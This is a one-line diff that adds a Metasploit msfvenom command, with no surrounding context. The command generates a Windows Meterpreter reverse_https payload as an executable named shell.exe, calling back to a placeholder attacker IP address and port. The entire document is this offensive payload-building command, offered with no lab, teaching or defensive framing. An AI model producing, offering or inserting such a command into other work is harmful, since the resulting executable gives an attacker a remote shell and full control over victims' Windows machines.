@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_https lhost=IP-ADDRESS lport=PORT -f exe -o shell.exe
